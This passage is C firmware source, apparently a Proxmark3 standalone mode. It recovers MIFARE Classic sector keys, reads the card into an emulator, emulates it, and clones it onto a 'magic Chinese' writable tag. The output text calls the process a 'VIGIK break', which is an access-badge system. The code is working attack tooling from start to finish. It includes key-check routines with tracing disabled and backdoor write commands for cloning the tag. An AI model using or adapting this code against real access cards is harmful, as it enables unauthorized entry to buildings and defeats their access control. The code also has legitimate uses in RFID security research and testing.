        DbprintfEx(FLAG_NEWLINE, "%s[ FAIL ]%s\r\n->did not found all the keys :'(", _XRED_, _XWHITE_);
        cjSetCursLeft();
        SpinErr(1, 100, 8);
        SpinOff(100);
        return;
    }

    /* Settings keys to emulator */
    emlClearMem();
    uint8_t mblock[16];
    for (uint8_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
        emlGetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
        for (uint8_t t = 0; t < 2; t++) {
            memcpy(mblock + t * 10, foundKey[t][sectorNo], 6);
        }
        emlSetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
    }
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "%s>>%s Setting Keys->Emulator MEM...[%sOK%s]", _XYELLOW_, _XWHITE_, _XGREEN_, _XWHITE_);

    /* filling TAG to emulator */
    int filled;
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "%s>>%s Filling Emulator <- from A keys...", _XYELLOW_, _XWHITE_);
    filled = e_MifareECardLoad(sectorsCnt, 0);
    if (filled != PM3_SUCCESS) {
        cjSetCursLeft();

        DbprintfEx(FLAG_NEWLINE, "%s>>%s W_FAILURE ! %sTrying fallback B keys....", _XRED_, _XORANGE_, _XWHITE_);

        /* no trace, no dbg  */
        filled = e_MifareECardLoad(sectorsCnt, 1);
        if (filled != PM3_SUCCESS) {
            cjSetCursLeft();

            DbprintfEx(FLAG_NEWLINE, "FATAL:EML_FALLBACKFILL_B");
            SpinErr(2, 100, 8);
            SpinOff(100);
            return;
        }
    }

    delta_time = GetTickCountDelta(start_time);
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "%s>>%s Time for VIGIK break :%s%dms%s", _XGREEN_, _XWHITE_, _XYELLOW_, delta_time, _XWHITE_);

    vtsend_cursor_position_save(NULL);
    vtsend_set_attribute(NULL, 1);
    vtsend_set_attribute(NULL, 5);
    cjTabulize();
    DbprintfEx(FLAG_NEWLINE, "[    WRITING FLASH   ]");
    cjSetCursLeft();
    cjSetCursLeft();

    WriteTagToFlash(0, 1024);

readysim:
    // SIM ?
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "-> We launch Emulation ->");
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "%s!> HOLD ON : %s When you'll click, simm will stop", _XRED_, _XWHITE_);
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "Then %s immediately %s we'll try to %s dump our emulator state%s \r\nin a %s chinese tag%s", _XRED_, _XWHITE_, _XYELLOW_, _XWHITE_,
               _XCYAN_, _XWHITE_);
    cjSetCursLeft();
    cjSetCursLeft();

    cjTabulize();

    DbprintfEx(FLAG_NEWLINE, "[    SIMULATION   ]");
    vtsend_set_attribute(NULL, 0);

    SpinOff(100);
    LED_C_ON();

    uint16_t flags;
    switch (p_card.uidlen) {
        case 10:
            flags = FLAG_10B_UID_IN_DATA;
            break;
        case 7:
            flags = FLAG_7B_UID_IN_DATA;
            break;
        default:
            flags = FLAG_4B_UID_IN_DATA;
            break;
    }
    Mifare1ksim(flags | FLAG_MF_1K, 0, cjuid);
    LED_C_OFF();
    SpinOff(50);
    vtsend_cursor_position_restore(NULL);
    DbprintfEx(FLAG_NEWLINE, "[   SIMUL ENDED   ]%s", _XGREEN_, _XWHITE_);
    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "<- We're out of Emulation");
    // END SIM

    cjSetCursLeft();

    DbprintfEx(FLAG_NEWLINE, "-> Trying a clone !");
    saMifareMakeTag();
    cjSetCursLeft();
    vtsend_cursor_position_restore(NULL);
    DbprintfEx(FLAG_NEWLINE, "%s[ CLONED? ]", _XCYAN_);

    DbprintfEx(FLAG_NEWLINE, "-> End Cloning.");
    WDT_HIT();

    // Debunk...
    cjSetCursLeft();
    cjTabulize();
    vtsend_set_attribute(NULL, 0);
    vtsend_set_attribute(NULL, 7);
    DbprintfEx(FLAG_NEWLINE, "- [ LA FIN ] -\r\n%s`-> You can take shell back :) ...", _XWHITE_);
    cjSetCursLeft();
    vtsend_set_attribute(NULL, 0);
    SpinErr(3, 100, 16);
    SpinDown(75);
    SpinOff(100);
    return;
}

/* Abusive microgain on original MifareECardLoad :
 * - *datain used as error return
 * - tracing is falsed
 */
int e_MifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
    DBGLEVEL = DBG_NONE;

    uint8_t numSectors = numofsectors;
    uint8_t keyType = keytype;

    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;

    uint8_t dataoutbuf[16];
    uint8_t dataoutbuf2[16];

    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);

    clear_trace();
    set_tracing(false);

    bool isOK = true;

    if (!iso14443a_select_card(cjuid, &p_card, &cjcuid, true, 0, true)) {
        isOK = false;
        if (DBGLEVEL >= 1)
            DbprintfEx(FLAG_RAWPRINT, "Can't select card");
    }

    for (uint8_t s = 0; isOK && s < numSectors; s++) {
        uint64_t ui64Key = emlGetKey(s, keyType);
        if (s == 0) {
            if (isOK && mifare_classic_auth(pcs, cjcuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_FIRST)) {

                if (DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NEWLINE, "Sector[%2d]. Auth error", s);
                break;
            }
        } else {
            if (isOK && mifare_classic_auth(pcs, cjcuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_NESTED)) {
                isOK = false;
                if (DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NEWLINE, "Sector[%2d]. Auth nested error", s);
                break;
            }
        }

        for (uint8_t blockNo = 0; isOK && blockNo < NumBlocksPerSector(s); blockNo++) {
            if (isOK && mifare_classic_readblock(pcs, cjcuid, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
                isOK = false;
                if (DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NEWLINE, "Error reading sector %2d block %2d", s, blockNo);
                break;
            };
            if (isOK) {
                if (blockNo < NumBlocksPerSector(s) - 1) {
                    emlSetMem(dataoutbuf, FirstBlockOfSector(s) + blockNo, 1);
                } else {
                    // sector trailer, keep the keys, set only the AC
                    emlGetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
                    memcpy(&dataoutbuf2[6], &dataoutbuf[6], 4);
                    emlSetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
                }
            }
        }
    }

    if (mifare_classic_halt(pcs, cjcuid)) {
        if (DBGLEVEL >= 1)
            DbprintfEx(FLAG_NEWLINE, "Halt error");
    };

    crypto1_destroy(pcs);

    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);

    return (isOK) ? PM3_SUCCESS : PM3_EUNDEF;
}

/* the chk function is a piwi’ed(tm) check that will try all keys for
a particular sector. also no tracing no dbg */
int cjat91_saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace, uint8_t keyCount, uint8_t *datain, uint64_t *key) {
    DBGLEVEL = DBG_NONE;
    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    set_tracing(false);

    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;

    for (int i = 0; i < keyCount; ++i) {

        /* no need for anticollision. just verify tag is still here */
        // if (!iso14443a_fast_select_card(cjuid, 0)) {
        if (!iso14443a_select_card(cjuid, &p_card, &cjcuid, true, 0, true)) {
            cjSetCursLeft();
            DbprintfEx(FLAG_NEWLINE, "%sFATAL%s : E_MF_LOSTTAG", _XRED_, _XWHITE_);
            return -1;
        }

        uint64_t ui64Key = bytes_to_num(datain + i * 6, 6);
        if (mifare_classic_auth(pcs, cjcuid, blockNo, keyType, ui64Key, AUTH_FIRST)) {
            uint8_t dummy_answer = 0;
            ReaderTransmit(&dummy_answer, 1, NULL);
            // wait for the card to become ready again
            SpinDelayUs(AUTHENTICATION_TIMEOUT);
            continue;
        }
        crypto1_destroy(pcs);
        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
        *key = ui64Key;
        return i;
    }
    crypto1_destroy(pcs);
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);

    return -1;
}

void saMifareMakeTag(void) {
    uint8_t cfail = 0;
    cjSetCursLeft();
    cjTabulize();
    vtsend_cursor_position_save(NULL);
    vtsend_set_attribute(NULL, 1);
    DbprintfEx(FLAG_NEWLINE, "[ CLONING ]");
    vtsend_set_attribute(NULL, 0);

    cjSetCursFRight();

    DbprintfEx(FLAG_NEWLINE, ">> Write to Special:");
    int flags = 0;
    for (int blockNum = 0; blockNum < 16 * 4; blockNum++) {
        uint8_t mblock[16];
        // cnt = 0;
        emlGetMem(mblock, blockNum, 1);
        // switch on field and send magic sequence
        if (blockNum == 0)
            flags = 0x08 + 0x02;

        // just write
        if (blockNum == 1)
            flags = 0;

        // Done. Magic Halt and switch off field.
        if (blockNum == 16 * 4 - 1)
            flags = 0x04 + 0x10;

        if (saMifareCSetBlock(0, flags & 0xFE, blockNum, mblock)) {
            //&& cnt <= retry) {
            // cnt++;
            cjSetCursFRight();
            if (currfline > 53) {
                currfline = 54;
            }
            DbprintfEx(FLAG_NEWLINE, "Block :%02x %sOK%s", blockNum, _XGREEN_, _XWHITE_);
            //                                                      DbprintfEx(FLAG_RAWPRINT,"FATAL:E_MF_CHINESECOOK_NORICE");
            //                                                      cfail=1;
            // return;
            continue;
        } else {
            cjSetCursLeft();
            cjSetCursLeft();

            DbprintfEx(FLAG_NEWLINE, "`--> %sFAIL%s : CHN_FAIL_BLK_%02x_NOK", _XRED_, _XWHITE_, blockNum);
            cjSetCursFRight();
            DbprintfEx(FLAG_NEWLINE, "%s>>>>%s STOP AT %02x", _XRED_, _XWHITE_, blockNum);
            cfail++;
            break;
        }
        cjSetCursFRight();

        DbprintfEx(FLAG_NEWLINE, "%s>>>>>>>> END <<<<<<<<%s", _XYELLOW_, _XWHITE_);
        // break;
        /*if (cfail == 1) {
                DbprintfEx(FLAG_RAWPRINT,"FATAL: E_MF_HARA_KIRI_\r\n");
                break;
        } */
    }
    if (cfail == 0) {
        SpinUp(50);
        SpinUp(50);
        SpinUp(50);
    }
}

//-----------------------------------------------------------------------------
// Matt's StandAlone mod.
// Work with "magic Chinese" card (email him: ouyangweidaxian@live.cn)
//-----------------------------------------------------------------------------
int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_t *datain) {
    // params
    uint8_t needWipe = arg0;
    // bit 0 - need get UID
    // bit 1 - need wupC
    // bit 2 - need HALT after sequence
    // bit 3 - need init FPGA and field before sequence
    // bit 4 - need reset FPGA and LED
    uint8_t workFlags = arg1;
    uint8_t blockNo = arg2;

    // card commands
    uint8_t wupC1[] = {0x40};
    uint8_t wupC2[] = {0x43};
    uint8_t wipeC[] = {0x41};

    // variables
    uint8_t isOK = 0;
    uint8_t d_block[18] = {0x00};

    uint8_t receivedAnswer[MAX_MIFARE_FRAME_SIZE];
    uint8_t receivedAnswerPar[MAX_MIFARE_PARITY_SIZE];

    // reset FPGA and LED
    if (workFlags & 0x08) {
        iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
        //  clear_trace();
        set_tracing(FALSE);
    }

    while (true) {
        cjSetCursLeft();

        // get UID from chip
        if (workFlags & 0x01) {
            if (!iso14443a_select_card(cjuid, &p_card, &cjcuid, true, 0, true)) {
                DbprintfEx(FLAG_NEWLINE, "Can't select card");
                break;
            };

            if (mifare_classic_halt(NULL, cjcuid)) {
                DbprintfEx(FLAG_NEWLINE, "Halt error");
                break;
            };
        };

        // reset chip
        if (needWipe) {
            ReaderTransmitBitsPar(wupC1, 7, 0, NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wupC1 error");
                break;
            };

            ReaderTransmit(wipeC, sizeof(wipeC), NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wipeC error");
                break;
            };

            if (mifare_classic_halt(NULL, cjcuid)) {
                DbprintfEx(FLAG_NEWLINE, "Halt error");
                break;
            };
        };

        // chaud
        // write block
        if (workFlags & 0x02) {
            ReaderTransmitBitsPar(wupC1, 7, 0, NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wupC1 error");
                break;
            };

            ReaderTransmit(wupC2, sizeof(wupC2), NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wupC2 errorv");
                break;
            };
        }

        if ((mifare_sendcmd_short(NULL, 0, 0xA0, blockNo, receivedAnswer, receivedAnswerPar, NULL) != 1) || (receivedAnswer[0] != 0x0a)) {
            DbprintfEx(FLAG_NEWLINE, "write block send command error");
            break;
        };

        memcpy(d_block, datain, 16);
        AddCrc14A(d_block, 16);
        ReaderTransmit(d_block, sizeof(d_block), NULL);
        if ((ReaderReceive(receivedAnswer, receivedAnswerPar) != 1) || (receivedAnswer[0] != 0x0a)) {
            DbprintfEx(FLAG_NEWLINE, "write block send data error");
            break;
        };

        if (workFlags & 0x04) {
            if (mifare_classic_halt(NULL, cjcuid)) {
                cjSetCursFRight();

                DbprintfEx(FLAG_NEWLINE, "Halt error");
                break;
            };
        }

        isOK = 1;
        break;
    }

    if ((workFlags & 0x10) || (!isOK)) {
        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    }

    return isOK;
}
